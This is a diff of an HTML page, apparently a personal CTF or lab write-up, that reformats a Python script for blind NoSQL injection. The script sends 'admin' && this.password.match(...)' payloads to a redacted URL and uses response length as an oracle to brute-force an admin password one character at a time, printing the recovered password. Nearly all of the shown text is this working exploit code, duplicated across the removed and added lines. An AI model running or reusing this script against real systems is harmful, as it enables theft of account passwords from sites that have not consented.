@@ -42,46 +42,47 @@ Display all the columns field contents in the information_schema user table<br>
 <h4>shitscript</h4>
 
 
-<textarea>import requests
-  bruten = '1234567890abcdef-'
-  xx=0
-  x = bruten[xx]
-  keylist = ""
-  keystr = keylist + x
-  #URL='[redacted]/?search=admin%27%20%26%26%20this.password.match(/^.{}/)%00'.format(keystr)
-  URL='[redacted]/?search=admin%27%20%26%26%20this.password.match(/^{}.*$/)%00'.format(keystr)
-  r = requests.get(URL)
-  s = (len(r.content))
+<code>
+import requests
+bruten = '1234567890abcdef-'
+xx=0
+x = bruten[xx]
+keylist = ""
+keystr = keylist + x
+#URL='[redacted]/?search=admin%27%20%26%26%20this.password.match(/^.{}/)%00'.format(keystr)
+URL='[redacted]/?search=admin%27%20%26%26%20this.password.match(/^{}.*$/)%00'.format(keystr)
+r = requests.get(URL)
+s = (len(r.content))
+</code>
+<code>  
+while True:
+  try:
+    for i in range(0, 17):    
+      x = bruten[xx]
+      keystr = keylist + x
+      #URL='[redacted]/?search=admin%27%20%26%26%20this.password.match(/^.{}/)%00'.format(keystr)
+      URL='[redacted]/?search=admin%27%20%26%26%20this.password.match(/^{}.*$/)%00'.format(keystr)
+      print(URL)
+      print(keystr)
+      #print(keylist)
+      r = requests.get(URL)
+      s = (len(r.content))
+      #print(s)
+      if s == 1614:
+        keystr = keylist + x
+        keystr = keystr
+        keylist = keylist + x
+        #print(keylist)
+        xx=0
+        continue
   
-  while True:
-      try:
-          for i in range(0, 17):
-              
-              x = bruten[xx]
-              keystr = keylist + x
-              #URL='[redacted]/?search=admin%27%20%26%26%20this.password.match(/^.{}/)%00'.format(keystr)
-              URL='[redacted]/?search=admin%27%20%26%26%20this.password.match(/^{}.*$/)%00'.format(keystr)
-              print(URL)
-              print(keystr)
-              #print(keylist)
-              r = requests.get(URL)
-              s = (len(r.content))
-              #print(s)
-              if s == 1614:
-                  keystr = keylist + x
-                  keystr = keystr
-                  keylist = keylist + x
-                  #print(keylist)
-                  xx=0
-                  continue
-  
-              else:
-                  #keylist = ""
-                  keystr = keylist + x
-                  keystr = keystr
-                  xx+=1
-                  continue
-      except:
-          print("crackarooniedddddd")
-          print('password is ' + keystr[:-1])
-          break  </textarea>
+      else:
+        #keylist = ""
+        keystr = keylist + x
+        keystr = keystr
+        xx+=1
+        continue
+    except:
+      print("crackarooniedddddd")
+      print('password is ' + keystr[:-1])
+      break  </code>
